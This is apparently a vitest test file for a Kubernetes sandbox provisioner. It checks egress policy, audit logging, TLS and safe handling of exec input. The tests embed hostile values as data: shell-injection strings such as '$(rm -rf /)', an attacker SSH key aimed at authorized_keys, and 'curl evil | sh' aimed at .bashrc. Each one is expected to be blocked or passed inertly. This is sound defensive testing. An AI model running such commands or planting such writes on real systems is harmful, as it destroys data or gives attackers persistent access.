import { execFileSync, spawnSync } from "node:child_process";
import { chmodSync, existsSync, mkdirSync, mkdtempSync, readFileSync, realpathSync, symlinkSync, writeFileSync } from "node:fs";
import { createServer, type Server } from "node:https";
import type { AddressInfo } from "node:net";
import { tmpdir } from "node:os";
import { join } from "node:path";
import type { Duplex } from "node:stream";
import { afterEach, describe, expect, it } from "vitest";
import { WebSocketServer } from "ws";

import { createSandboxAudit } from "./sandbox-audit.ts";
import { SANDBOX_STARTING_CODE } from "./sandbox-k8s-wake.ts";
import { SandboxError, SandboxService } from "./sandboxd-core.ts";
import { createSandboxdHandler } from "./sandboxd.ts";
import { SandboxdVerifier } from "./sandboxd-auth.ts";
import { kubeconfigFileFromEnv, kubernetesClient, type K8sClient, type K8sResponse } from "./sandboxd-k8s-client.ts";
import { kubernetesApi, withExecEnv } from "./sandboxd-k8s.ts";
import { PAUSED_ANNOTATION, kubernetesSandboxConfigFromEnv } from "./sandboxd-k8s-spec.ts";
import { FakeDocker } from "./testing/fake-docker.ts";
import { sandboxdClient } from "./user-sandbox-client.ts";
import { SANDBOX_INSTANCE_LABEL, SANDBOX_LABEL, SANDBOX_USER_LABEL, sandboxKeyForPrincipal, sandboxNames, sandboxdConfigFromEnv } from "./user-sandbox-spec.ts";
import { callUserSandboxTool, type ToolExec } from "./user-sandbox-tools.ts";

const DIGEST = "cd".repeat(32);
const REGISTRY = "ghcr.io/pulsatrixtechnologies";
const IMAGE = `${REGISTRY}/sagax-sandbox:1.0.0@sha256:${DIGEST}`;
const KEY = "a".repeat(64);
const person = sandboxKeyForPrincipal("default", "pr_00000000-0000-4000-8000-0000000000bb");

type Obj = Record<string, unknown>;

function mergePatch(target: Obj, patch: Obj): void {
  for (const [field, value] of Object.entries(patch)) {
    if (field === "__proto__" || field === "constructor" || field === "prototype") continue;
    if (value === null) {
      delete target[field];
      continue;
    }
    if (value && typeof value === "object" && !Array.isArray(value) && target[field] && typeof target[field] === "object" && !Array.isArray(target[field])) {
      mergePatch(target[field] as Obj, value as Obj);
      continue;
    }
    target[field] = value;
  }
}

function memoryCluster(exec?: K8sClient["exec"]): { client: K8sClient; objects: Map<string, Obj> } {
  const objects = new Map<string, Obj>();
  const client: K8sClient = {
    async request(method, path, body): Promise<K8sResponse> {
      const url = new URL(path, "https://kubernetes.local");
      const pathname = url.pathname;
      if (method === "GET" && url.searchParams.has("labelSelector")) {
        const selector = url.searchParams.get("labelSelector") ?? "";
        const wanted = selector.split(",").filter(Boolean).map((pair) => {
          const index = pair.indexOf("=");
          return [pair.slice(0, index), pair.slice(index + 1)] as const;
        });
        const prefix = `${pathname}/`;
        const items = [...objects.entries()].filter(([stored, obj]) => {
          if (!stored.startsWith(prefix) || stored.slice(prefix.length).includes("/")) return false;
          const labels = ((obj.metadata as Obj | undefined)?.labels ?? {}) as Record<string, string>;
          return wanted.every(([field, value]) => labels[field] === value);
        }).map(([, obj]) => obj);
        return { status: 200, body: { items } };
      }
      if (method === "GET") {
        const found = objects.get(pathname);
        return found ? { status: 200, body: found } : { status: 404, body: {} };
      }
      if (method === "DELETE") {
        if (!objects.delete(pathname)) return { status: 404, body: {} };
        return { status: 200, body: {} };
      }
      if (method === "PATCH") {
        const found = objects.get(pathname);
        if (!found) return { status: 404, body: {} };
        mergePatch(found, (body ?? {}) as Obj);
        return { status: 200, body: found };
      }
      const spec = JSON.parse(JSON.stringify(body ?? {})) as Obj;
      const name = String((spec.metadata as Obj | undefined)?.name ?? "");
      const target = `${pathname}/${name}`;
      if (objects.has(target)) return { status: 409, body: { message: "already exists" } };
      if (spec.kind === "Pod") spec.status = { phase: "Running" };
      objects.set(target, spec);
      return { status: 201, body: spec };
    },
    exec: exec ?? (async () => ({ stdout: Buffer.from("0123456789"), stderr: Buffer.from("abcdefghij"), exitCode: 3 })),
    async execStream(): Promise<Duplex> {
      throw new Error("execStream is not used in this fixture");
    },
    async metrics() {
      return null;
    },
  };
  objects.set("/api/v1/namespaces/sandboxes", { metadata: { name: "sandboxes" } });
  objects.set("/apis/storage.k8s.io/v1/storageclasses/encrypted", {
    metadata: { name: "encrypted", annotations: {} },
    parameters: { encrypted: "true" },
  });
  return { client, objects };
}

function harness(dir: string, exec?: K8sClient["exec"]) {
  const auditFile = join(dir, "audit.jsonl");
  const processEnv = {
    SAGAX_SANDBOX_IMAGE: IMAGE,
    SAGAX_SANDBOX_K8S_STORAGE_CLASS: "encrypted",
    SAGAX_SANDBOX_K8S_REGISTRY: REGISTRY,
    SAGAX_SANDBOXD_TLS_INSECURE: "1",
    SAGAX_SANDBOX_K8S_SECRETS_ENCRYPTED: "true",
    SAGAX_SANDBOX_K8S_NETWORK_POLICY: "enforced",
    SAGAX_SANDBOX_AUDIT_LOG: auditFile,
  };
  const sandbox = sandboxdConfigFromEnv(processEnv);
  const { k8s } = kubernetesSandboxConfigFromEnv(processEnv, sandbox);
  const audit = createSandboxAudit({ file: auditFile });
  const cluster = memoryCluster(exec);
  const api = kubernetesApi(sandbox, k8s, cluster.client, audit);
  const service = new SandboxService(api, sandbox);
  return { sandbox, k8s, audit, auditFile, api, service, objects: cluster.objects };
}

describe("kubernetes client auth", () => {
  it("uses ~/.kube/config when the kind flag is set and KUBECONFIG is unset", () => {
    expect(kubeconfigFileFromEnv({ SAGAX_SANDBOX_K8S_USE_KUBECONFIG: "1" }, "/home/me/.kube/config")).toBe("/home/me/.kube/config");
    expect(kubeconfigFileFromEnv({ SAGAX_SANDBOX_K8S_USE_KUBECONFIG: "1", KUBECONFIG: "/tmp/k" }, "/home/me/.kube/config")).toBe("/tmp/k");
    expect(kubeconfigFileFromEnv({
      SAGAX_SANDBOX_K8S_KUBECONFIG: "/tmp/explicit",
      SAGAX_SANDBOX_K8S_USE_KUBECONFIG: "1",
      KUBECONFIG: "/tmp/k",
    }, "/home/me/.kube/config")).toBe("/tmp/explicit");
    expect(kubeconfigFileFromEnv({}, "/home/me/.kube/config")).toBe("");
  });
});

describe("kubernetes sandbox lifecycle", () => {
  it("applies egress as a NetworkPolicy and never a privileged pod", async () => {
    const dir = mkdtempSync(join(tmpdir(), "sagax-k8s-"));
    const { service, objects } = harness(dir);
    expect(await service.installEgressPolicy()).toBe("enforced");
    const kinds = [...objects.values()].map((obj) => obj.kind);
    expect(kinds).toContain("NetworkPolicy");
    expect(kinds).not.toContain("Pod");
    expect(objects.has("/apis/networking.k8s.io/v1/namespaces/sandboxes/networkpolicies/sagax-default-deny")).toBe(true);
  });

  it("creates one pod and one claim, pauses without releasing the slot, then removes them", async () => {
    const dir = mkdtempSync(join(tmpdir(), "sagax-k8s-"));
    const { service, objects, api, auditFile } = harness(dir);
    await service.installEgressPolicy();
    expect((await service.ensure(person)).state).toBe("running");
    const names = sandboxNames(person);
    const podPath = `/api/v1/namespaces/sandboxes/pods/${names.container}`;
    const claimPath = `/api/v1/namespaces/sandboxes/persistentvolumeclaims/${names.volume}`;
    expect(objects.has(podPath)).toBe(true);
    expect(objects.has(claimPath)).toBe(true);
    expect((await service.pause(person)).state).toBe("paused");
    expect(objects.has(podPath)).toBe(false);
    const paused = objects.get(claimPath)!;
    expect(((paused.metadata as Obj).annotations as Obj)[PAUSED_ANNOTATION]).toBe("true");
    const running = await api.listContainers({ [SANDBOX_LABEL]: "1", [SANDBOX_INSTANCE_LABEL]: "default" });
    expect(running.find((row) => row.name === names.container)?.running).toBe(true);
    expect((await service.resume(person)).state).toBe("running");
    expect(objects.has(podPath)).toBe(true);
    expect((await service.stop(person)).state).toBe("stopped");
    expect(objects.has(podPath)).toBe(false);
    expect(objects.has(claimPath)).toBe(true);
    expect((await service.remove(person)).state).toBe("missing");
    expect(objects.has(claimPath)).toBe(false);
    const lines = readFileSync(auditFile, "utf8").trim().split("\n").map((line) => JSON.parse(line) as { action: string; detail?: { argv0?: string } });
    expect(lines.some((line) => line.action === "sandbox.pod.create")).toBe(true);
    expect(lines.some((line) => line.action === "sandbox.pvc.create")).toBe(true);
  });

  it("refuses a foreign pod, a bad image, an unencrypted class, and a one-shot container", async () => {
    const dir = mkdtempSync(join(tmpdir(), "sagax-k8s-"));
    const { service, objects, api, k8s, auditFile } = harness(dir);
    await service.installEgressPolicy();
    const names = sandboxNames(person);
    objects.set(`/api/v1/namespaces/sandboxes/pods/${names.container}`, {
      kind: "Pod",
      metadata: {
        name: names.container,
        labels: { [SANDBOX_LABEL]: "1", [SANDBOX_USER_LABEL]: "f".repeat(32), [SANDBOX_INSTANCE_LABEL]: "default" },
      },
      status: { phase: "Running" },
    });
    await expect(service.ensure(person)).rejects.toMatchObject({ status: 409, code: "conflict" });
    objects.delete(`/api/v1/namespaces/sandboxes/pods/${names.container}`);
    expect(await api.imageExists("sagax-sandbox:local")).toBe(false);
    const storage = objects.get(`/apis/storage.k8s.io/v1/storageclasses/${k8s.storageClass}`)!;
    storage.parameters = {};
    await expect(service.ensure(person)).rejects.toThrow(/encryption at rest/);
    await expect(api.runOnce("helper", { Labels: {}, HostConfig: { NetworkMode: "bridge", CapAdd: [] } }, 1000)).rejects.toThrow(/one-shot/);
    const audit = readFileSync(auditFile, "utf8");
    expect(audit).toContain("egress.helper");
    expect(audit).not.toContain("super-secret");
  });

  it("records exec as the program name and the exit code", async () => {
    const dir = mkdtempSync(join(tmpdir(), "sagax-k8s-"));
    const { service, api, auditFile } = harness(dir);
    await service.installEgressPolicy();
    await service.ensure(person);
    const names = sandboxNames(person);
    const result = await api.exec(names.container, { Cmd: ["echo", "super-secret"], User: "1000:1000", Env: ["SAGAX_TOKEN=super-secret"], WorkingDir: "/workspace" }, 4);
    expect(result.truncated).toBe(true);
    expect(result.stdout.toString("utf8")).toBe("0123");
    expect(result.exitCode).toBe(3);
    const lines = readFileSync(auditFile, "utf8").trim().split("\n").map((line) => JSON.parse(line) as { action: string; detail?: Record<string, unknown> });
    const exec = lines.find((line) => line.action === "sandbox.exec");
    expect(exec?.detail).toEqual({ argv0: "echo", exit: 3 });
    expect(readFileSync(auditFile, "utf8")).not.toContain("super-secret");
  });
});

describe("sandbox audit log", () => {
  it("appends, refuses to follow a link, and ships only over https", async () => {
    const dir = mkdtempSync(join(tmpdir(), "sagax-audit-"));
    const file = join(dir, "audit.jsonl");
    const first = createSandboxAudit({ file, now: () => new Date("2026-10-12T00:00:00.000Z") });
    first.record({ action: "provisioner.start", outcome: "ok" });
    const second = createSandboxAudit({ file, now: () => new Date("2026-10-12T00:00:01.000Z") });
    second.record({ action: "sandbox.pod.create", outcome: "ok", key: person });
    const lines = readFileSync(file, "utf8").trim().split("\n");
    expect(lines).toHaveLength(2);
    expect(JSON.parse(lines[0]!).action).toBe("provisioner.start");
    expect(JSON.parse(lines[1]!).action).toBe("sandbox.pod.create");
    const link = join(dir, "linked.jsonl");
    symlinkSync(file, link);
    // O_NOFOLLOW does not exist on Windows; the provisioner that writes this log runs on Linux only
    if (process.platform !== "win32") expect(() => createSandboxAudit({ file: link })).toThrow();
    expect(() => createSandboxAudit({ file, shipUrl: "http://collector.example/in" })).toThrow(/https/);
    const posts: { url: string; body: string }[] = [];
    const shipped = createSandboxAudit({
      file: join(dir, "ship.jsonl"),
      shipUrl: "https://collector.example/ingest",
      fetchImpl: (async (url: string | URL, init?: RequestInit) => {
        posts.push({ url: String(url), body: String(init?.body ?? "") });
        return new Response("ok");
      }) as typeof fetch,
    });
    shipped.record({ action: "sandbox.pod.start", outcome: "ok", key: person });
    await new Promise((resolve) => setTimeout(resolve, 30));
    expect(posts[0]?.url).toBe("https://collector.example/ingest");
    expect(posts[0]?.body).toContain("sandbox.pod.start");
    expect(() => createSandboxAudit({ file, shipUrl: "https://user:pw@collector.example/in" })).toThrow(/credentials/);
  });
});

describe("provisioner https", () => {
  const servers: Server[] = [];
  afterEach(async () => {
    await Promise.all(servers.splice(0).map((server) => new Promise<void>((resolve) => server.close(() => resolve()))));
  });

  it("reaches the provisioner when the caller presents the CA", async () => {
    const dir = mkdtempSync(join(tmpdir(), "sagax-tls-"));
    const cert = join(dir, "cert.pem");
    const keyFile = join(dir, "key.pem");
    execFileSync("openssl", ["req", "-x509", "-newkey", "rsa:2048", "-keyout", keyFile, "-out", cert, "-days", "1", "-nodes", "-subj", "/CN=127.0.0.1", "-addext", "subjectAltName=IP:127.0.0.1"]);
    const docker = new FakeDocker();
    const config = sandboxdConfigFromEnv({ SAGAX_SANDBOX_IMAGE: "sagax-sandbox:test" });
    const service = new SandboxService(docker, config);
    await service.installEgressPolicy();
    const server = createServer({ cert: readFileSync(cert), key: readFileSync(keyFile) }, createSandboxdHandler(service, new SandboxdVerifier(KEY)));
    await new Promise<void>((resolve) => server.listen(0, "127.0.0.1", resolve));
    servers.push(server);
    const port = (server.address() as AddressInfo).port;
    const client = sandboxdClient(`https://127.0.0.1:${port}`, () => KEY, fetch, { ca: readFileSync(cert) });
    expect((await client.info()).egress).toBe("enforced");
  });
});

function selfSignedCert(dir: string): { cert: Buffer; key: Buffer } {
  const cert = join(dir, "cert.pem");
  const keyFile = join(dir, "key.pem");
  execFileSync("openssl", ["req", "-x509", "-newkey", "rsa:2048", "-keyout", keyFile, "-out", cert, "-days", "1", "-nodes", "-subj", "/CN=127.0.0.1", "-addext", "subjectAltName=IP:127.0.0.1"], { stdio: "ignore" });
  return { cert: readFileSync(cert), key: readFileSync(keyFile) };
}

/** Run a command as the sandbox would get it from the API server, here:
 * the given stdin, the sandbox's `timeout` wrapper dropped (macOS has none),
 * stub programs first in PATH. */
function localExec(dir: string, stubs: string, seen: { command: string[]; stdin?: Buffer }[]): K8sClient["exec"] {
  return async (_namespace, _pod, command, stdin) => {
    seen.push({ command, ...(stdin ? { stdin } : {}) });
    const argv = [...command];
    const at = argv.findIndex((arg, index) => arg === "timeout" && argv[index + 1] === "-k");
    if (at >= 0) argv.splice(at, 4);
    const run = spawnSync(argv[0]!, argv.slice(1), {
      cwd: dir,
      input: stdin ?? Buffer.alloc(0),
      env: { PATH: `${stubs}:${process.env.PATH ?? ""}`, STUB_OUT: join(dir, "stub-out") },
      maxBuffer: 8 * 1024 * 1024,
    });
    return { stdout: run.stdout, stderr: run.stderr, exitCode: run.status };
  };
}

function stub(stubs: string, name: string, script: string): void {
  writeFileSync(join(stubs, name), `#!/bin/sh\n${script}\n`);
  chmodSync(join(stubs, name), 0o755);
}

describe("kubernetes exec variables (the API server's exec has no environment)", () => {
  const python = spawnSync("python3", ["-c", "pass"]).status === 0;

  it("leaves a command without variables as it is", () => {
    expect(withExecEnv(["ls", "-la"], [], "null")).toEqual({ command: ["ls", "-la"] });
  });

  it("sends the variables on stdin, never on the command line", () => {
    const value = "secret value $(rm -rf /) `x` 'q' \"d\"\nline é";
    const call = withExecEnv(["printenv", "SAGAX_TEXT"], [`SAGAX_TEXT=${value}`], "null");
    expect(call.command.join("\u0000")).not.toContain("secret value");
    expect(call.command.slice(-2)).toEqual(["printenv", "SAGAX_TEXT"]);
    expect(JSON.parse(call.stdin!.toString("utf8"))).toEqual({ SAGAX_TEXT: value });
    expect(call.command[4]).toBe(String(call.stdin!.length));
  });

  it.runIf(python)("sets them for the real command (python3 loader), exactly as given", () => {
    const value = "a=b\n'quote' \"dq\" $(id) é \u{1F600}\n";
    const call = withExecEnv(["sh", "-c", 'printf %s "$SAGAX_TEXT"; cat'], [`SAGAX_TEXT=${value}`, "SAGAX_OTHER=1"], "null");
    // "null": the command's own stdin is empty, whatever follows on the socket
    const run = spawnSync(call.command[0]!, call.command.slice(1), { input: Buffer.concat([call.stdin!, Buffer.from("not for the command")]) });
    expect(run.status).toBe(0);
    expect(run.stdout.toString("utf8")).toBe(value);
    // "keep": a stream (a person's MCP server) gets the rest of its stdin
    const kept = withExecEnv(["sh", "-c", 'printf "%s|" "$SAGAX_OTHER"; cat'], ["SAGAX_OTHER=1"], "keep");
    const streamed = spawnSync(kept.command[0]!, kept.command.slice(1), { input: Buffer.concat([kept.stdin!, Buffer.from("frame-1\n")]) });
    expect(streamed.stdout.toString("utf8")).toBe("1|frame-1\n");
  });

  it.runIf(python)("keeps the shell's exit codes: 127 for a missing program, 125 when the variables never arrive", () => {
    const missing = withExecEnv(["sagax-no-such-program"], ["SAGAX_X=1"], "null");
    expect(spawnSync(missing.command[0]!, missing.command.slice(1), { input: missing.stdin }).status).toBe(127);
    const short = withExecEnv(["true"], ["SAGAX_X=1"], "null");
    expect(spawnSync(short.command[0]!, short.command.slice(1), { input: Buffer.alloc(0) }).status).toBe(125);
  });

  it("the client writes stdin on channel 0 in frames, then reads the output and the exit status", async () => {
    const dir = mkdtempSync(join(tmpdir(), "sagax-k8s-ws-"));
    const tls = selfSignedCert(dir);
    const server = createServer(tls);
    const wss = new WebSocketServer({ server });
    const seen: { command: string[]; stdin: string | null; frames: number } = { command: [], stdin: null, frames: 0 };
    const payload = Buffer.alloc(200 * 1024, "x");
    wss.on("connection", (socket, request) => {
      const url = new URL(request.url ?? "/", "https://127.0.0.1");
      seen.command = url.searchParams.getAll("command");
      seen.stdin = url.searchParams.get("stdin");
      let got = 0;
      socket.on("message", (data: Buffer) => {
        if (data[0] !== 0) return;
        seen.frames += 1;
        got += data.length - 1;
        if (got === payload.length) {
          socket.send(Buffer.concat([Buffer.from([1]), Buffer.from(String(got))]));
          socket.send(Buffer.concat([Buffer.from([3]), Buffer.from(JSON.stringify({ status: "Success" }))]));
          socket.close();
        }
      });
    });
    await new Promise<void>((resolve) => server.listen(0, "127.0.0.1", resolve));
    try {
      const port = (server.address() as AddressInfo).port;
      const client = kubernetesClient({ server: `https://127.0.0.1:${port}`, ca: tls.cert });
      const result = await client.exec("sandboxes", "sagax-user-x", ["head", "-c", String(payload.length)], payload);
      expect(result.exitCode).toBe(0);
      expect(result.stdout.toString("utf8")).toBe(String(payload.length));
      expect(seen.stdin).toBe("true");
      expect(seen.command).toEqual(["head", "-c", String(payload.length)]);
      expect(seen.frames).toBeGreaterThan(1);
    } finally {
      wss.close();
      await new Promise<void>((resolve) => server.close(() => resolve()));
    }
  });
});

describe("kubernetes exec stdin when the command ends first", () => {
  it("answers the command's exit status, not a send error", async () => {
    const dir = mkdtempSync(join(tmpdir(), "sagax-k8s-ws-"));
    const tls = selfSignedCert(dir);
    const server = createServer(tls);
    const wss = new WebSocketServer({ server });
    wss.on("connection", (socket) => {
      socket.once("message", () => {
        socket.send(Buffer.concat([Buffer.from([2]), Buffer.from("the path changed while it was read\n")]));
        socket.send(Buffer.concat([Buffer.from([3]), Buffer.from(JSON.stringify({ status: "Failure", details: { causes: [{ reason: "ExitCode", message: "3" }] } }))]));
        socket.close();
      });
    });
    await new Promise<void>((resolve) => server.listen(0, "127.0.0.1", resolve));
    try {
      const port = (server.address() as AddressInfo).port;
      const client = kubernetesClient({ server: `https://127.0.0.1:${port}`, ca: tls.cert });
      const result = await client.exec("sandboxes", "sagax-user-x", ["sh"], Buffer.alloc(2 * 1024 * 1024, 1));
      expect(result.exitCode).toBe(3);
      expect(result.stderr.toString("utf8")).toContain("the path changed");
    } finally {
      wss.close();
      await new Promise<void>((resolve) => server.close(() => resolve()));
    }
  });
});

describe.runIf(spawnSync("python3", ["-c", "pass"]).status === 0)("environment tools on the kubernetes backend", () => {
  async function setup() {
    const dir = realpathSync(mkdtempSync(join(tmpdir(), "sagax-k8s-tools-")));
    const stubs = join(dir, "bin");
    mkdirSync(stubs);
    stub(stubs, "sagax-desktop", 'printf "%s:%s" "$1" "${SAGAX_TEXT:-${SAGAX_URL:-}}" > "$STUB_OUT"');
    stub(stubs, "chromium", 'last=""; for a; do last="$a"; case "$a" in --screenshot=*) printf png > "${a#--screenshot=}";; esac; done; printf %s "$last" > "$STUB_OUT"');
    const seen: { command: string[]; stdin?: Buffer }[] = [];
    const { service } = harness(dir, localExec(dir, stubs, seen));
    await service.installEgressPolicy();
    await service.ensure(person);
    const exec: ToolExec = { exec: (input) => service.exec(person, input), overQuota: async () => false };
    return { dir, seen, exec, out: () => readFileSync(join(dir, "stub-out"), "utf8") };
  }
  const message = (result: { content: { type: string; text?: string }[] }) => result.content.map((part) => part.text ?? "").join("");

  it("write_file: small and large contents arrive whole, through stdin, not the command line", async () => {
    const { dir, seen, exec } = await setup();
    // small: one variable, which the loader sets from stdin
    const small = "line $(rm -rf /) 'q' \"d\" é\nlast without newline";
    const smallTarget = join(dir, "notes", "small.txt");
    const wrote = await callUserSandboxTool("write_file", { path: smallTarget, content: small }, exec);
    expect(wrote.isError, message(wrote)).toBeFalsy();
    expect(readFileSync(smallTarget, "utf8")).toBe(small);
    const smallB64 = Buffer.from(small, "utf8").toString("base64");
    expect(seen.some((call) => call.command.join("\u0000").includes(smallB64))).toBe(false);
    expect(seen.some((call) => call.stdin?.toString("utf8").includes(smallB64))).toBe(true);
    // large (past one variable's 128 KiB): the bytes themselves on stdin
    const content = `${"line $(rm -rf /) 'q' \"d\" é\n".repeat(30_000)}end without newline`;
    const target = join(dir, "notes", "deep", "a.txt");
    const result = await callUserSandboxTool("write_file", { path: target, content }, exec);
    expect(result.isError, message(result)).toBeFalsy();
    expect(readFileSync(target, "utf8")).toBe(content);
    const last = seen.at(-1)!;
    expect(last.stdin?.equals(Buffer.from(content, "utf8"))).toBe(true);
    expect(last.command.join("\u0000")).not.toContain("line $(rm");
  });

  it("write_file leaves the file untouched when the contents do not all arrive", async () => {
    const { dir } = await setup();
    const target = join(dir, "kept.txt");
    writeFileSync(target, "original");
    const seen: { command: string[]; stdin?: Buffer }[] = [];
    const inner = localExec(dir, join(dir, "bin"), seen);
    // a provisioner from before stdin: the bytes are dropped
    const { service } = harness(dir, (namespace, pod, command) => inner(namespace, pod, command));
    await service.installEgressPolicy();
    await service.ensure(person);
    const exec: ToolExec = { exec: (input) => service.exec(person, input), overQuota: async () => false };
    const result = await callUserSandboxTool("write_file", { path: target, content: "y".repeat(100 * 1024) }, exec);
    expect(result.isError).toBe(true);
    expect(message(result)).toMatch(/did not all arrive/);
    expect(readFileSync(target, "utf8")).toBe("original");
  });

  it("computer_use type_text and open_url: the text and the address reach sagax-desktop", async () => {
    const { seen, exec, out } = await setup();
    const typed = "hello 'world' $(id) \"x\"\nsecond é";
    const result = await callUserSandboxTool("computer_use", { tool_name: "type_text", arguments: { text: typed } }, exec);
    expect(result.isError, message(result)).toBeFalsy();
    expect(out()).toBe(`type:${typed}`);
    expect(seen.at(-1)!.command.join("\u0000")).not.toContain("hello 'world'");
    const opened = await callUserSandboxTool("computer_use", { tool_name: "open_url", arguments: { url: "https://example.com/a?b=c&d='e'" } }, exec);
    expect(opened.isError, message(opened)).toBeFalsy();
    expect(out()).toBe("open-url:https://example.com/a?b=c&d=%27e%27");
  });

  it("browse with a screenshot: the address reaches chromium", async () => {
    const { exec, out } = await setup();
    const result = await callUserSandboxTool("browse", { url: "https://example.com/page?q=1", screenshot: true }, exec);
    expect(out()).toBe("https://example.com/page?q=1");
    // base64 -w0 is GNU (the sandbox image); macOS has no -w
    if (process.platform === "linux") {
      expect(result.isError, message(result)).toBeFalsy();
      expect(result.content[0]).toMatchObject({ type: "image", data: Buffer.from("png").toString("base64") });
    }
  });

  it("write_file refuses a link into .ssh or onto a dotfile, and follows an ordinary one", async () => {
    const { dir, exec } = await setup();
    mkdirSync(join(dir, ".ssh"));
    symlinkSync(join(dir, ".ssh"), join(dir, "keys"));
    const viaKeys = await callUserSandboxTool("write_file", { path: join(dir, "keys", "authorized_keys"), content: "ssh-ed25519 AAAA attacker" }, exec);
    expect(viaKeys.isError).toBe(true);
    expect(message(viaKeys)).toMatch(/credential location/);
    expect(existsSync(join(dir, ".ssh", "authorized_keys"))).toBe(false);

    writeFileSync(join(dir, ".bashrc"), "original\n");
    symlinkSync(join(dir, ".bashrc"), join(dir, "notes.txt"));
    const viaNotes = await callUserSandboxTool("write_file", { path: join(dir, "notes.txt"), content: "curl evil | sh" }, exec);
    expect(viaNotes.isError).toBe(true);
    expect(readFileSync(join(dir, ".bashrc"), "utf8")).toBe("original\n");

    mkdirSync(join(dir, "real-docs"));
    symlinkSync(join(dir, "real-docs"), join(dir, "docs"));
    const ordinary = await callUserSandboxTool("write_file", { path: join(dir, "docs", "readme.md"), content: "# hi" }, exec);
    expect(ordinary.isError, message(ordinary)).toBeFalsy();
    expect(readFileSync(join(dir, "real-docs", "readme.md"), "utf8")).toBe("# hi");
  });
});

describe("a pod that does not run in time (2026-10-19, cold node pool)", () => {
  it("answers 503 starting, so the caller may send the call again: nothing ran", async () => {
    const dir = mkdtempSync(join(tmpdir(), "sagax-k8s-"));
    const auditFile = join(dir, "audit.jsonl");
    const processEnv = {
      SAGAX_SANDBOX_IMAGE: IMAGE, SAGAX_SANDBOX_K8S_STORAGE_CLASS: "encrypted", SAGAX_SANDBOX_K8S_REGISTRY: REGISTRY,
      SAGAX_SANDBOXD_TLS_INSECURE: "1", SAGAX_SANDBOX_K8S_SECRETS_ENCRYPTED: "true", SAGAX_SANDBOX_K8S_NETWORK_POLICY: "enforced",
      SAGAX_SANDBOX_AUDIT_LOG: auditFile,
    };
    const sandbox = sandboxdConfigFromEnv(processEnv);
    const { k8s } = kubernetesSandboxConfigFromEnv(processEnv, sandbox);
    const cluster = memoryCluster();
    const pending: K8sClient = {
      ...cluster.client,
      async request(method, path, body) {
        const answer = await cluster.client.request(method, path, body);
        const obj = answer.body as Obj;
        if (obj?.kind === "Pod") obj.status = { phase: "Pending" };
        return answer;
      },
    };
    let clock = 0;
    const api = kubernetesApi(sandbox, k8s, pending, createSandboxAudit({ file: auditFile }), { now: () => clock, sleep: async (ms) => { clock += ms; } });
    const service = new SandboxService(api, sandbox, () => clock);
    await service.installEgressPolicy();
    const refusal = await service.ensure(person).catch((error: unknown) => error);
    expect(refusal).toBeInstanceOf(SandboxError);
    expect(refusal).toMatchObject({ status: 503, code: SANDBOX_STARTING_CODE });
  });
});
